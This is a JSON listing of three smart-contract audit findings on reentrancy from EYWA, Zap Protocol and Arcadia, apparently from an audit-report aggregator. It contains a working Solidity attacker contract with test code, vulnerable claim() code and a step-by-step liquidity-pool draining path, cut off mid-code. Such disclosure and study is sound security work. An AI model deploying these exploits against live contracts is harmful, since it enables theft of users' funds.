{
  "tag": "Reentrancy",
  "count": 59,
  "metadata": {
    "totalResults": 59,
    "totalPages": 1
  },
  "last_rateLimit": {
    "limit": 20,
    "remaining": 13,
    "reset": 1771761120
  },
  "findings": [
    {
      "id": "44334",
      "kind": "MARKDOWN",
      "auditfirm_id": "23",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "1864",
      "title": "Reentrancy in `EscrowManager`",
      "content": "##### Description\n\nOpenZeppelin ERC721 NFT implementations invoke the receiver whenever the `safeTransferFrom()` or `safeMint()` methods are called.\n\nA hacker can exploit this mechanism by triggering a callback from `EscrowManager` during the execution of methods such as `createLock()` (when `_safeMint()` is invoked), `deboost()` (when `safeTransferFrom()` is invoked), and `withdraw()` (also when `safeTransferFrom()` is invoked), especially when the state of `EscrowManager` is inconsistent. This can corrupt storage variables or result in voting power gain.\n\n**Example 1**: Reentrancy in the `deboost()` method with duplicate boosters.\n\nAn attacker can exploit a reentrancy vulnerability in the `deboost()` method, manipulating the boosting mechanism to their advantage:\n1. The attacker calls the `deboost()` method and passes the same boosting NFT ID multiple times, e.g., `deboost(escrowId, [1,1,1,1,1,1,1,1])`.\n2. During the transfer process, the `deboost()` method triggers a callback to the attacker’s contract.\n3. Each time the attacker’s contract receives the NFT, it transfers the NFT back to `EscrowManager`.\n\nAs a result, the escrow boosting coverage can be reduced to zero, even though other boosting NFTs may still be present and not withdrawn. This makes subsequent calculations inaccurate, disproportionately **inflating** the attacker’s `lockAmount` and voting power.\n\nIn the following proof-of-concept (PoC), after the attacker calls `deboost()`, their voting power **increases** significantly:\n```\nHacker votes before deboost: 4402998660126770n\nHacker votes after  deboost: 1105121050824042828n\n```\n\nThe PoC consists of two parts of code. First, the js-part:\n```\nawait checkDeboostReentrancy(\n    \"aliceTokenId3\", \n    \"Common2\", \n    \"eywa NFT locked without boost\");\nasync function checkDeboostReentrancy(\n    aliceTokenId, eywaTokenId, description) {\ndescribe(`Test reentrancy`, () => {\n  describe(\"Test\", () => {\n  it(\"Test Reentrancy\", async () => {\n    const { eywaNFT, escrowManager, alice, AliceTokenId, TokenId } = \n          await loadFixture(deploy);\n    \n    const otherBoosters = \n    await escrowManager.getBoostersByTokenId(AliceTokenId[\"aliceTokenId4\"])\n    \n    await escrowManager.connect(alice).deboost(\n        AliceTokenId[\"aliceTokenId4\"], [otherBoosters[0]])\n    await eywaNFT.connect(alice).approve(\n        await escrowManager.getAddress(), otherBoosters[0])\n    await escrowManager.connect(alice).boost(\n        AliceTokenId[aliceTokenId], [otherBoosters[0]])\n    console.log(\n        await escrowManager.getBoostersByTokenId(AliceTokenId[aliceTokenId]))\n\n    const hackerContract = await (\n        await ethers.getContractFactory(\"HackerHolder\")).deploy(\n          await escrowManager.getAddress(),\n          AliceTokenId[aliceTokenId],\n          TokenId[eywaTokenId],\n          await escrowManager.COLLECTION(),\n    )\n    const hackerAddress = await hackerContract.getAddress()\n    await escrowManager.connect(alice).transferFrom(\n        alice, hackerAddress, AliceTokenId[aliceTokenId])\n    console.log(\"Hacker votes before deboost\", \n                await escrowManager.getVotes(hackerAddress))\n    await hackerContract.exploit()\n    console.log(\"Hacker votes after  deboost\", \n                await escrowManager.getVotes(hackerAddress))\n  })\n})\n})\n}\n```\n\nSecond, the hacker's contract:\n```solidity\ncontract HackerHolder is ERC721Holder {\n  ICollection public immutable COLLECTION;\n  EscrowManager es;\n  uint escrowId;\n  uint boostId;\n  uint256[] collectionTokenIds;\n  uint exploiting;\n\n  constructor(\n      EscrowManager es_, \n      uint escrowId_, \n      uint boostId_, \n      address collection) {\n    COLLECTION = ICollection(collection);\n    es = es_;\n    escrowId = escrowId_;\n    boostId = boostId_;\n  }\n\n  function exploit() external {\n    delete collectionTokenIds;\n    collectionTokenIds.push(boostId);\n    collectionTokenIds.push(boostId);\n    exploiting = collectionTokenIds.length - 1;\n\n    es.deboost(escrowId, collectionTokenIds);\n  }\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) public virtual override returns (bytes4) {\n    if (exploiting > 0) {\n      exploiting--;\n      COLLECTION.transferFrom(address(this), address(es), boostId);\n    }\n    return super.onERC721Received.selector;\n  }\n}\n```\n\n**Example 2**: A hacker can corrupt storage variables via `createLock()` and `withdraw()` methods.\n\n**Attack Scenario:**\n1. The attacker calls the `createLock()` method to mint a new NFT lock.\n2. During the `_safeMint()` process, the `ERC721Utils.checkOnERC721Received()` callback is triggered on the attacker’s contract.\n3. Within this callback, the attacker calls `EscrowManager.withdraw()`, burning the newly minted NFT. \n4. At this point, the NFT’s state has not yet been fully updated in the `createLock()` function, allowing the attacker to corrupt the **totalLocked** value.\n\nThis altered **totalLocked** value could distort token emission calculations in the `emissionManager` contract, leading to unfair or excessive token distributions.\n\n##### Recommendation\n\nWe recommend using the following approaches against reentrancy:\n1. Use Check-Effect-Interaction pattern when minting, burning or transferring NFTs.\n2. Use reentrancy guard modifiers.\n3. Use methods that do not cause an unintentional callback.\n\n***",
      "summary": "\nThe OpenZeppelin ERC721 NFT implementation has a vulnerability that can be exploited by hackers. This vulnerability allows them to manipulate the boosting mechanism and gain an unfair advantage in voting power. This can happen when certain methods are called, such as `createLock()`, `deboost()`, and `withdraw()`, and the state of the `EscrowManager` is inconsistent. This can lead to corrupt storage variables and inaccurate calculations. The report provides a proof-of-concept example of how this can be done and recommends using certain approaches to prevent this type of reentrancy attack. ",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 5,
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/EYWA/DAO/README.md#4-reentrancy-in-escrowmanager",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "reentrancy-in-escrowmanager-mixbytes-none-eywa-markdown",
      "firm_name": "MixBytes",
      "firm_logo_square": "mixbytes_square.png",
      "protocol_name": "EYWA",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "MixBytes",
        "logo_square": "mixbytes_square.png"
      },
      "protocols_protocol": {
        "name": "EYWA",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "31192",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 27,
      "protocol_id": "1330",
      "title": "H-3: Reentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(i)",
      "content": "Source: https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157 \n\n## Found by \n0x4non, 0xR360, 0xhashiman, 404666, AMOW, BengalCatBalu, HonorLt, Silvermist, UbiquitousComputing, Varun\\_05, ZdravkoHr., aman, bughuntoor, cats, cawfree, denzi\\_, dipp, enfrasico, klaus, mike-watson, nilay27, no, novaman33, psb01, s1ce, thank\\_you, turvec\n## Summary\nReentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(I)\n\n## Vulnerability Detail\nHere is the Vesting.sol:claim() function:\n```solidity\nfunction claim() external {\n        address sender = msg.sender;\n\n        UserDetails storage s = userdetails[sender];\n        require(s.userDeposit != 0, \"No Deposit\");\n@>      require(s.index != vestingPoints.length, \"already claimed\");\n        uint256 pctAmount;\n        uint256 i = s.index;\n        for (i; i <= vestingPoints.length - 1; i++) {\n            if (block.timestamp >= vestingPoints[i][0]) {\n                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n            } else {\n                break;\n            }\n        }\n        if (pctAmount != 0) {\n            if (address(token) == address(1)) {\n@>              (bool sent, ) = payable(sender).call{value: pctAmount}(\"\");\n                require(sent, \"Failed to send BNB to receiver\");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n@>          s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n    }\n```\nFrom the above, You'll notice the claim() function checks if the caller already claimed by checking if the s.index has already been set to vestingPoints.length. You'll also notice the claim() function executes .call() and transfer the amount to the caller before setting the s.index = uint128(i), thereby allowing reentrancy.\n\nLet's consider this sample scenario:\n- An attacker contract(alice) has some native pctAmount to claim and calls `claim()`.\n- \"already claimed\" check will pass since it's the first time she's calling `claim()` so her s.index hasn't been set\n- However before updating Alice s.index, the Vesting contract performs external .call() to Alice with the amount sent as well\n- Alice reenters `claim()` again on receive of the amount\n- bypass index \"already claimed\" check since this hasn't been updated yet\n- contract performs external .call() to Alice with the amount sent as well again,\n- Same thing happens again\n- Alice ends up draining the Vesting contract\n\n## Impact\nReentrancy in Vesting.sol:claim() will allow users to drain the contract\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-03-zap-protocol/blob/main/zap-contracts-labs/contracts/Vesting.sol#L84\nhttps://github.com/sherlock-audit/2024-03-zap-protocol/blob/main/zap-contracts-labs/contracts/Vesting.sol#L89\n\n## Tool used\n\nManual Review\n\n## Recommendation\nHere is the recommended fix:\n```diff\nif (pctAmount != 0) {\n+           s.index = uint128(i);\n            if (address(token) == address(1)) {\n                (bool sent, ) = payable(sender).call{value: pctAmount}(\"\");\n                require(sent, \"Failed to send BNB to receiver\");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n-           s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n```\nI'll also recommend using reentrancyGuard.\n\n\n\n## Discussion\n\n**midori-fuse**\n\nEscalate \n\nPer Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):\n\n> In the above example if the root issue A is one of the following generic vulnerabilities:\n> - Reentrancy\n> - Access control\n> - Front-running\n>\n> Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\n> - B is a valid issue\n> - C is low\n\nThe following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #149  . \n- The issues in this category should be Low.\n\nThe following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more). \n- While they did not (or vaguely) described the \"attack path\", the attack path here is just \"directly calling `claim()` in your `receive()`\", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\n- Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\n\n**sherlock-admin2**\n\n> Escalate \n> \n> Per Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):\n> \n> > In the above example if the root issue A is one of the following generic vulnerabilities:\n> > - Reentrancy\n> > - Access control\n> > - Front-running\n> >\n> > Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\n> > - B is a valid issue\n> > - C is low\n> \n> The following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #149  . \n> - The issues in this category should be Low.\n> \n> The following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more). \n> - While they did not (or vaguely) described the \"attack path\", the attack path here is just \"directly calling `claim()` in your `receive()`\", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\n> - Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Nilay27**\n\n> Escalate\n> \n> Per Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):\n> \n> > In the above example if the root issue A is one of the following generic vulnerabilities:\n> > \n> > * Reentrancy\n> > * Access control\n> > * Front-running\n> > \n> > Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\n> > \n> > * B is a valid issue\n> > * C is low\n> \n> The following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #134 #149 .\n> \n> * The issues in this category should be Low.\n> \n> The following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more).\n> \n> * While they did not (or vaguely) described the \"attack path\", the attack path here is just \"directly calling `claim()` in your `receive()`\", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\n> * Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\n\n#134 identifies the issue of how the re-entrance occurs and suggests the same remediation.\nIt clearly explains the following:\n\"The vulnerability arises from the contract's failure to update a user's claim state (s.index and s.amountClaimed) before transferring funds to the user, which allows a malicious contract to receive the funds and re-enter the claim function before the original call completes, potentially claiming more funds repeatedly.\"\n\nThe recommendation suggests updating the state before or using a reentrancy guard.\n\n I am unsure why that has been included in the `low` category per your escalation?  \n\n**midori-fuse**\n\n@Nilay27 I suppose you are right. Sorry about that, there are just too many dupes here, I might have confused it with another issue that got lost somewhere.\n\nBut be assured that unless the head of judging downright disagrees with me, all dupes will be reviewed and judged accordingly. Once again I'm sorry for my mistake.\n\n**novaman33**\n\nMy issue - #10 does show the root cause clearly and does suggest a thorough recommendation for the mitigation. I do not agree it is vague. \n\n**keesmark**\n\nIt is the same as this one, but why is it considered invalid? #119 \n\n**novaman33**\n\nProbably because #119 says that reentrancy will occur when transferring erc20 tokens while call is used to transfer eth.\n\n\n**ZdravkoHr**\n\nAlso, BNB is out of scope\n\n**Hash01011122**\n\nAcknowledging that every mentioned issue accurately identifies both the root cause of the vulnerability and the correct attack paths, yet noting the straightforward nature of the issue as a reason for minimal effort in Watson's issue, suggests a potential oversight in the importance of comprehensive reporting. \n\n**shubham-antier**\n\nIssue resolved: Moved the updations above the transfers. Also, added a reentrancy guard to better the security.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/2.\n\n**Evert0x**\n\n@Hash01011122 what's your proposal on the exact family for this issue? Which reports should be excluded/included?\n\n**Hash01011122**\n\n@Evert0x Had a indepth review of this family of issues:\nIssues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149.\nThe pinpoint the root cause but fail to explain any attack vector.\n\n**armormadeofwoe**\n\n> @Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.\n\nHi @Hash01011122, with all due respect, I believe #138 should remain valid since it showcases:\nroot cause - sending funds before updating variables (breach of CEI pattern)\nattack path - the ability to trigger an arbitrary fallback function due to sending native ETH that could re-enter the same function and continue claiming funds due to the unchanged variables. \n\nI do agree that my report is a little short as this is arguably the most known and recognizable issue in this space, decided to spare the judges some extra reading.\n\n\n\n**Hash01011122**\n\nImao #138 should be excluded as I mentioned above,\n\n**0x3agle**\n\n@Hash01011122 \n#6 accurately identifies the root cause and the attack path.\nRoot cause:\n> If the token == address(1) (i.e. the native token) it performs an external call which sends the token to msg.sender and then updates the storage variable.\n\nAttack Path:\n> This allows an attacker to reenter the claim function until the contract is drained completely.\n\n**Hash01011122**\n\n@0x3agle with all due respect your report doesn't mention any appropriate Attack Path.\n\n**0x3agle**\n\n@Hash01011122 \n\nIssue: storage variable updated after external call\nAttack path: reentering the claim function\nImpact: Contract drained\nMitigation: Follow CEI, add non-reentrant\n\nIsn't this enough for this issue to be considered a valid one? \n\nThis issue is so obvious I didn't feel the need for a PoC to convey my point. \n\nHaving said that, I respect your decision and will accept it. \n\n**Hash01011122**\n\nHey, if we look from that lens even issues like #10, #34, #66, #132 and #138 should be valid too. I understand what you are pointing even I don't want to invalidate any of the issues as I understand watson's would not spend more effort on writing low hanging fruit issues, However, I'm just adhering to Sherlock's rulebook. Do you want to add anything here @0x3agle?\n\n**Evert0x**\n\n> @Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.\n\nPlanning to accept escalation and move remove the reports mentioned by the Lead Judge as duplicates\n\n**0x3agle**\n\n@Hash01011122 @Evert0x \nYou missed #53 and #104\n\n*P.S. I'm not a fan of pulling down other reports but if a selected portion of reports are being disqualified because they didn't mention a \"detailed\" attack path for an obvious issue, then every report that did not include a detailed description/PoC should be considered for disqualification.*\n\n**novaman33**\n\n@Evert0x could you please identify how #10 fails to explain the attack vector. I believe the attack path is stated clearly and that the solution is also very detailed. \n\n\n**Hash01011122**\n\nAgreed, @0x3agle we can add those issues in our list. Updated issues to get excluded will be:\n#6, #10, #34, #53, #66, #79, #90, #104, #132, #138, #149 \n\n**Hash01011122**\n\n@novaman33 I don't see any valid attack path mentioned in #10 report.\n\n**Evert0x**\n\nI believe #10 identified the attack pack and shows a good understanding of the issue.\n\nAfter taken a detailed look at all reports, I believe only the following ones should be excluded as all other reports pinpoint the exact logic in the code that allows the reentrancy to happen. \n\nhttps://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/6, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/34, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/66, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/79, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/90, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/132,  https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/149\n\n**Evert0x**\n\nResult:\nHigh\nHas Duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [midori-fuse](https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157/#issuecomment-2025184779): accepted",
      "summary": "\nIssue H-3 is a vulnerability in the Vesting.sol contract that allows users to drain the contract by exploiting the claim() function. This is due to the contract executing .call() on the user's address before setting s.index = uint128(i). The vulnerability was found by multiple users and has been escalated for review. It is recommended to use a reentrancy guard to prevent this issue. Various discussions and escalations have taken place regarding the severity and validity of duplicate reports. The issue has been resolved by moving the updates above the transfers and adding a reentrancy guard. ",
      "report_date": {},
      "contest_prize_txt": "8375 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/243",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 2,
      "general_score": 1,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "243",
      "slug": "h-3-reentrancy-in-vestingsolclaim-will-allow-users-to-drain-the-contract-due-to-executing-call-on-users-address-before-setting-sindex-uint128i-sherlock-zap-protocol-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Zap Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Zap Protocol",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "30446",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "1246",
      "title": "H-2: Reentrancy in flashAction() allows draining liquidity pools",
      "content": "Source: https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/153 \n\n## Found by \n0xadrii, zzykxx\n## Summary\nIt is possible to drain a liquidity pool/creditor if the pool’s asset is an ERC777 token by triggering a reentrancy flow using flash actions.\n\n## Vulnerability Detail\nThe following vulnerability describes a complex flow that allows draining any liquidity pool where the underlying asset is an ERC777 token. Before diving into the vulnerability, it is important to properly understand and highlight some concepts from Arcadia that are relevant in order to allow this vulnerability to take place:\n\n- **Flash actions**: flash actions in Arcadia operate in a similar fashion to flash loans. Any account owner will be able to borrow an arbitrary amount from the creditor without putting any collateral as long as the account remains in a healthy state at the end of execution. The following steps summarize what actually happens when `LendingPool.flashAction()` flow is triggered:\n    1. The amount borrowed (plus fees) will be minted to the account as debt tokens. This means that the amount borrowed in the flash action **will be accounted as debt** during the whole `flashAction()` execution. If a flash action borrowing 30 tokens is triggered for an account that already has 10 tokens in debt, the debt balance of the account will increase to 40 tokens + fees.\n    2. Borrowed asset will be transferred to the `actionTarget`. The `actionTarget` is an **arbitrary address** passed as parameter in the `flashAction()`. It is important to be aware of the fact that transferring the borrowed funds is performed **prior to calling flashActionByCreditor(),** which is the function that will end up verifying the account’s health state. This is the step where the reentrancy will be triggered by the `actionTarget`.\n    3. The account’s `flashActionByCreditor()` function is called. This is the last step in the execution function, where a health check for the account is performed (among other things).\n    \n    ```solidity\n    // LendingPool.sol\n    \n    function flashAction(\n            uint256 amountBorrowed,\n            address account,\n            address actionTarget, \n            bytes calldata actionData,\n            bytes3 referrer\n        ) external whenBorrowNotPaused processInterests {\n            ... \n    \n            uint256 amountBorrowedWithFee = amountBorrowed + amountBorrowed.mulDivUp(originationFee, ONE_4);\n    \n            ...\n     \n            // Mint debt tokens to the Account, debt must be minted before the actions in the Account are performed.\n            _deposit(amountBorrowedWithFee, account);\n    \n            ...\n    \n            // Send Borrowed funds to the actionTarget.\n            asset.safeTransfer(actionTarget, amountBorrowed);\n     \n            // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n            // to execute one or more actions (swap, deposit, mint...).\n            // Next the action Target will deposit any of the remaining funds or any of the recipient token\n            // resulting from the actions back into the Account.\n            // As last step, after all assets are deposited back into the Account a final health check is done:\n            // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n            // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n            {\n                uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n                if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n            }\n     \n            ... \n        }\n    ```\n    \n- **Collateral value:** Each creditor is configured with some risk parameters in the `Registry` contract. One of the risk parameters is the `minUsdValue`, which is the minimum USD value any asset must have when it is deposited into an account for the creditor to consider such collateral as valid. If the asset does not reach the `minUsdValue`, it will simply be accounted with a value of 0. For example: if the `minUsdValue` configured for a given creditor is 100 USD and we deposit an asset in our account worth 99 USD (let’s say 99 USDT), the USDT collateral will be accounted as 0. This means that our USDT will be worth nothing at the eyes of the creditor. However, if we deposit one more USDT token into the account, our USD collateral value will increase to 100 USD, reaching the `minUsdValue`. Now, the creditor will consider our account’s collateral to be worth 100 USD instead of 0 USD.\n- **Liquidations:** Arcadia liquidates unhealthy accounts using a dutch-auction model. When a liquidation is triggered via `Liquidator.liquidateAccount()` all the information regarding the debt and assets from the account will be stored in `auctionInformation_` , which maps account addresses to an `AuctionInformation` struct. An important field in this struct is the `assetShares`, which will store the relative value of each asset, with respect to the total value of the Account.\n    \n    When a user wants to bid for an account in liquidation, the `Liquidator.bid()` function must be called. An important feature from this function is that it does not require the bidder to repay the loan in full (thus getting the full collateral in the account). Instead, the bidder can specify which collateral asset and amount wants to obtain back, and the contract will compute the amount of debt required to be repaid from the bidder for that amount of collateral. If the user wants to repay the full loan, all the collateral in the account will be specified by the bidder.\n    \n\nWith this background, we can now move on to describing the vulnerability in full.\n\nInitially, we will create an account and deposit collateral whose value is in the limit of the configured `minUsdValue` (if the `minUsdValue` is 100 tokens, the ideal amount to have will be 100 tokens to maximize gains). We will see why this is required later. The account’s collateral and debt status will look like this:\n\n![vuln1](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/569c3821-2932-4565-bdc3-f4f12f7907b2)\n\n\n\nThe next step after creating the account is to trigger a flash action. As mentioned in the introduction, the borrowed funds will be sent to the `actionTarget` (this will be a contract we create and control). An important requirement is that if the borrowed asset is an ERC777 token, we will be able to execute the ERC777 callback in our `actionTarget` contract, enabling us to gain control of the execution flow. Following our example, if we borrowed 200 tokens the account’s status would look like this:\n\n![vuln2](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/a41aee42-d0a2-461e-90fa-787762d2acfb)\n\nOn receiving the borrowed tokens, the actual attack will begin. The`actionTarget` will trigger the `Liquidator.liquidateAccount()` function to liquidate our own account. This is possible because  the funds borrowed using the flash action  are accounted as debt for our account (as we can see in the previous image, the borrowed amount greatly surpasses our account’s collateral value) prior to executing the `actionTarget` ERC777 callback, making the account susceptible of being liquidated. Executing this function will start the auction process and store data relevant to the account and its debt in the `auctionInformation_` mapping. \n\nAfter finishing the `liquidateAccount()` execution, the next step for the `actionTarget` is  to place a bid for our own account auction calling `Liquidator.bid()`. The trick here is to request a small amount from the account’s collateral in the `askedAssetAmounts` array (if we had 100 tokens as collateral in the account, we could ask for only 1). The small requested amount will make the computed `price` to pay for the bid by `_calculateBidPrice()`  be really small so that we can maximize our gains. Another requirement will be to set the `endAuction_` parameter to `true` (we will see why later):\n\n```solidity\n// Liquidator.sol\n\nfunction bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {\n        AuctionInformation storage auctionInformation_ = auctionInformation[account];\n        if (!auctionInformation_.inAuction) revert LiquidatorErrors.NotForSale();\n\n        // Calculate the current auction price of the assets being bought.\n        uint256 totalShare = _calculateTotalShare(auctionInformation_, askedAssetAmounts);\n        uint256 price = _calculateBidPrice(auctionInformation_, totalShare);\n\t\t\t\t\n\t\t\t\t// Transfer an amount of \"price\" in \"Numeraire\" to the LendingPool to repay the Accounts debt.\n        // The LendingPool will call a \"transferFrom\" from the bidder to the pool -> the bidder must approve the LendingPool.\n        // If the amount transferred would exceed the debt, the surplus is paid out to the Account Owner and earlyTerminate is True.\n        uint128 startDebt = auctionInformation_.startDebt;\n        bool earlyTerminate = ILendingPool(auctionInformation_.creditor).auctionRepay(\n            startDebt, auctionInformation_.minimumMargin, price, account, msg.sender\n        );\n\t\t...\n}\n```\n\nAfter computing the small price to pay for the bid, the`LendingPool.auctionRepay()` will be called. Because we are repaying a really small amount from the debt, the `accountDebt <= amount` condition will NOT hold, so the only actions performed by `LendingPool.auctionRepay()` will be transferring the small amount of tokens to pay the bid, and `_withdraw()` (burn) the corresponding debt from the account (a small amount of debt will be burnt here because the bid amount is small). It is also important to note that the `earlyTerminate` flag will remain as `false`:\n\n```solidity\n// LendingPool.sol\n\nfunction auctionRepay(uint256 startDebt, uint256 minimumMargin_, uint256 amount, address account, address bidder)\n        external\n        whenLiquidationNotPaused\n        onlyLiquidator \n        processInterests\n        returns (bool earlyTerminate)\n    {\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(bidder, address(this), amount);\n\n        uint256 accountDebt = maxWithdraw(account); \n        if (accountDebt == 0) revert LendingPoolErrors.IsNotAnAccountWithDebt();\n        if (accountDebt <= amount) {\n            // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.\n            // -> Terminate the auction and make the surplus available to the Account-Owner.\n            earlyTerminate = true;\n            unchecked {\n                _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));\n            }\n            amount = accountDebt;\n        }\n  \n        _withdraw(amount, address(this), account); \n\n        emit Repay(account, bidder, amount);\n    }\n```\n\nAfter `LendingPool.auctionRepay()` , execution will go back to `Liquidator.bid()`. The account’s `auctionBid()` function will then be called, which will transfer the 1 token requested by the bidder in the `askedAssetAmounts` parameter from the account’s collateral to the bidder. This is the most important concept in the attack. Because 1 token is moving out from the account’s collateral, the current collateral value from the account will be decreased from 100 USD to 99 USD, making the collateral value be under the minimum `minUsdValue` amount of 100 USD, and thus making the collateral value from the account go straight to 0 at the eyes of the creditor:\n\n![vuln3](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/498b92d7-6036-4d67-9acd-fdf5e139f930)\n\n\nBecause the `earlyTerminate` was NOT set to `true` in `LendingPool.auctionRepay()`, the `if (earlyTerminate)` condition will be skipped,  going straight to evaluate the `else if (endAuction_)` condition . Because we set the`endAuction_` parameter to true when calling the `bid()` function, `_settleAuction()` will execute.\n\n```solidity\n// Liquidator.sol\n\nfunction bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {\n        ...\n\t\t\t\t\n\t\t\t\t// Transfer the assets to the bidder.\n        IAccount(account).auctionBid(\n            auctionInformation_.assetAddresses, auctionInformation_.assetIds, askedAssetAmounts, msg.sender\n        );\n        // If all the debt is repaid, the auction must be ended, even if the bidder did not set endAuction to true.\n        if (earlyTerminate) {\n            // Stop the auction, no need to do a health check for the account since it has no debt anymore.\n            _endAuction(account);\n        }\n        // If not all debt is repaid, the bidder can still earn a termination incentive by ending the auction\n        // if one of the conditions to end the auction is met.\n        // \"_endAuction()\" will silently fail without reverting, if the auction was not successfully ended.\n        else if (endAuction_) {\n            if (_settleAuction(account, auctionInformation_)) _endAuction(account);\n        } \n    }\n```\n\n`_settleAuction()` is where the final steps of the attack will take place. Because we made the collateral value of our account purposely decrease from the `minUsdValue`, `_settleAuction` will interpret that all collateral has been sold, and the `else if (collateralValue == 0)` will evaluate to true, making the creditor’s `settleLiquidationUnhappyFlow()` function be called:\n\n```solidity\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        // Cache variables.\n        uint256 startDebt = auctionInformation_.startDebt;\n        address creditor = auctionInformation_.creditor;\n        uint96 minimumMargin = auctionInformation_.minimumMargin;\n\n        uint256 collateralValue = IAccount(account).getCollateralValue();\n        